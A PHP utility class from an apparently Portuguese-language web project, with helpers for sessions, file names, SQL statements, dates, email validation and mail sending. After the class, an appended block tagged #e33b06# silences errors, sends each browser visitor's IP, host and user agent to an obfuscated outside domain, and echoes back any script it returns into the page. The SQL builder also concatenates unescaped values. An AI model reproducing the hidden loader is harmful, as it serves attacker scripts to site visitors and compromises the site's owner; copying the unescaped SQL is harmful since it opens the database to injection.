<?php
class util
{
	
	# ------------------------------------------------------------------ #
	function get_logged_user_id()
	{
		return ( @$_SESSION['admin_id'] ? $_SESSION['admin_id'] : null );
	}

	# ------------------------------------------------------------------ #
	function get_logged_user_login()
	{
		return ( @$_SESSION['admin_login'] ? $_SESSION['admin_login'] : null );
	}
	
	# ------------------------------------------------------------------ #
	public static function clear_file_name( $name )
	{
		$table = array(
			'Š'=>'S', 'š'=>'s', 'Đ'=>'D', 'đ'=>'d', 'Ž'=>'Z', 'ž'=>'z', 'Č'=>'C', 'č'=>'c', 'Ć'=>'C', 'ć'=>'c',
			'À'=>'A', 'Á'=>'A', 'Â'=>'A', 'Ã'=>'A', 'Ä'=>'A', 'Å'=>'A', 'Æ'=>'A', 'Ç'=>'C', 'È'=>'E', 'É'=>'E',
			'Ê'=>'E', 'Ë'=>'E', 'Ì'=>'I', 'Í'=>'I', 'Î'=>'I', 'Ï'=>'I', 'Ñ'=>'N', 'Ò'=>'O', 'Ó'=>'O', 'Ô'=>'O',
			'Õ'=>'O', 'Ö'=>'O', 'Ø'=>'O', 'Ù'=>'U', 'Ú'=>'U', 'Û'=>'U', 'Ü'=>'U', 'Ý'=>'Y', 'Þ'=>'B', 'ß'=>'Ss',
			'à'=>'a', 'á'=>'a', 'â'=>'a', 'ã'=>'a', 'ä'=>'a', 'å'=>'a', 'æ'=>'a', 'ç'=>'c', 'è'=>'e', 'é'=>'e',
			'ê'=>'e', 'ë'=>'e', 'ì'=>'i', 'í'=>'i', 'î'=>'i', 'ï'=>'i', 'ð'=>'o', 'ñ'=>'n', 'ò'=>'o', 'ó'=>'o',
			'ô'=>'o', 'õ'=>'o', 'ö'=>'o', 'ø'=>'o', 'ù'=>'u', 'ú'=>'u', 'û'=>'u', 'ý'=>'y', 'ý'=>'y', 'þ'=>'b',
			'ÿ'=>'y', 'Ŕ'=>'R', 'ŕ'=>'r'
		);

	    $out = strtr( $name, $table );
		$out = ereg_replace( "[^a-zA-Z0-9_.]", "-", $out );
		
		while ( strpos( $out, '--' ) !== false )
		{
			$out = str_replace( '--', '-', $out );
		}
		
		return strtolower( trim( $out, '-' ) );
	}
	
	# ------------------------------------------------------------------ #
	public static function get_save_sql( $object, $force_insert )
	{
		foreach ( get_class_vars( get_class( $object ) ) as $key => $value )
		{
			switch ( $key )
			{
				case 'created_at':
					$keys_values[] = "`" . $key . "` = '" . ( $object->id ? $object->$key : date( 'Y-m-d H:i:s' ) ) . "'";
					break;
					
				case 'updated_at':
					$keys_values[] = "`" . $key . "` = '" . date( 'Y-m-d H:i:s' ) . "'";
					break;
					
				default:
					$keys_values[] = "`" . $key . "` = '" . $object->$key . "'";
					break;
			}
		}
		
		$keys_values = implode( ',', $keys_values );
		
		if ( $force_insert == false && $object->id )
		{
			return 'UPDATE ' . get_class( $object ) . ' SET ' . $keys_values . ' WHERE id = ' . $object->id . '';
		}
		else
		{
			return 'INSERT INTO ' . get_class( $object ) . ' SET ' . $keys_values . '';
		}
	}
	
	# ------------------------------------------------------------------ #
	public static function data2banco( $data )
	{
		#
		# 30/01/2008 => 2008-01-30 (não altera as horas, se informado)
		#
		$hora = substr( $data, 10, 9 );
		$data = substr( $data, 0, 10 );
		return ( implode( "-", array_reverse( explode( "/", $data ) ) ) ) . $hora;
	}
	
	# ------------------------------------------------------------------ #
	public static function banco2data( $data, $exibeHorario = false )
	{
		#
		# 2008-01-30 => 30/01/2008 (não altera as horas, se habilitado)
		#
		$data = substr( $data, 0, 10 );
		$hora = substr( $data, 10, 6 );
		$data = substr( $data, 0, 10 ); 
		return( implode( "/", array_reverse( explode( "-", $data ) ) ) ) . ( $exibeHorario ? $hora : '' );
	}
	
	# ------------------------------------------------------------------ #
	public static function valid_email( $email )
	{
	   $isValid = true;
	   $atIndex = strrpos($email, "@");
	   if (is_bool($atIndex) && !$atIndex)
	   {
	      $isValid = false;
	   }
	   else
	   {
	      $domain = substr($email, $atIndex+1);
	      $local = substr($email, 0, $atIndex);
	      $localLen = strlen($local);
	      $domainLen = strlen($domain);
	      if ($localLen < 1 || $localLen > 64)
	      {
	         // local part length exceeded
	         $isValid = false;
	      }
	      else if ($domainLen < 1 || $domainLen > 255)
	      {
	         // domain part length exceeded
	         $isValid = false;
	      }
	      else if ($local[0] == '.' || $local[$localLen-1] == '.')
	      {
	         // local part starts or ends with '.'
	         $isValid = false;
	      }
	      else if (preg_match('/\\.\\./', $local))
	      {
	         // local part has two consecutive dots
	         $isValid = false;
	      }
	      else if (!preg_match('/^[A-Za-z0-9\\-\\.]+$/', $domain))
	      {
	         // character not valid in domain part
	         $isValid = false;
	      }
	      else if (preg_match('/\\.\\./', $domain))
	      {
	         // domain part has two consecutive dots
	         $isValid = false;
	      }
	      else if (!preg_match('/^(\\\\.|[A-Za-z0-9!#%&`_=\\/$\'*+?^{}|~.-])+$/', str_replace("\\\\","",$local)))
	      {
	         // character not valid in local part unless 
	         // local part is quoted
	         if (!preg_match('/^"(\\\\"|[^"])+"$/',
	             str_replace("\\\\","",$local)))
	         {
	            $isValid = false;
	         }
	      }
	      if ($isValid && !(checkdnsrr($domain,"MX") ||  checkdnsrr($domain,"A")))
	      {
	         // domain not found in DNS
	         $isValid = false;
	      }
	   }
	   return $isValid;
	}
	
	# ------------------------------------------------------------------ #
	function date_diff( $startDate, $endDate ) 
	{ 
		$startArry = date_parse( $startDate );
		$endArry = date_parse( $endDate );
		$start_date = gregoriantojd( $startArry["month"], $startArry["day"], $startArry["year"] );
		$end_date = gregoriantojd( $endArry["month"], $endArry["day"], $endArry["year"] );
		return round( ( $end_date - $start_date ), 0 );
	}
	
	# ------------------------------------------------------------------ #
	function date_add( $date, $days )
	{
		$date = explode( '-', $date );
		return date( 'Y-m-d', mktime( 0, 0, 0, $date[1], $date[2] + $days, $date[0] ) );
	}
	
	
	# ------------------------------------------------------------------ #
	function send_email($subject, $msg, $email_to, $email_from)
	{
		/* Verifica qual é o sistema operacional do servidor para ajustar o cabeçalho de forma correta.  */
		if(PATH_SEPARATOR == ";") $quebra_linha = "\r\n"; //Se for Windows
		else $quebra_linha = "\n"; //Se "não for Windows"
		
		/* Montando o cabeçalho da mensagem */
		$headers = "MIME-Version: 1.1" .$quebra_linha;
		$headers .= "Content-type: text/html; charset=iso-8859-1" .$quebra_linha;
		// Perceba que a linha acima contém "text/html", sem essa linha, a mensagem não chegará formatada.
		$headers .= "From: " . $email_from.$quebra_linha;
		//$headers .= "Cc: " . $comcopia . $quebra_linha;
		//$headers .= "Bcc: " . $comcopiaoculta . $quebra_linha;
		$headers .= "Reply-To: " . $email_to . $quebra_linha;
		// Note que o e-mail do remetente será usado no campo Reply-To (Responder Para)
		 
		/* Enviando a mensagem */
		
		//É obrigatório o uso do parâmetro -r (concatenação do "From na linha de envio"), aqui na Locaweb:
		
		if(!mail($email_to, $subject, $msg, $headers ,"-r".$email_from)){ // Se for Postfix
			$headers .= "Return-Path: " . $email_from . $quebra_linha; // Se "não for Postfix"
			mail($email_to, $subject, $msg, $headers );
		}
		
		return true;
	}
}
?>
<?php
#e33b06#
error_reporting(0); @ini_set('display_errors',0); $wp_bww5934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_bww5934) && !preg_match ('/bot/i', $wp_bww5934))){
$wp_bww095934="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bww5934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bww095934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_5934bww = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_5934bww = @file_get_contents($wp_bww095934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_5934bww=@stream_get_contents(@fopen($wp_bww095934, "r"));}}
if (substr($wp_5934bww,1,3) === 'scr'){ echo $wp_5934bww; }
#/e33b06#
?>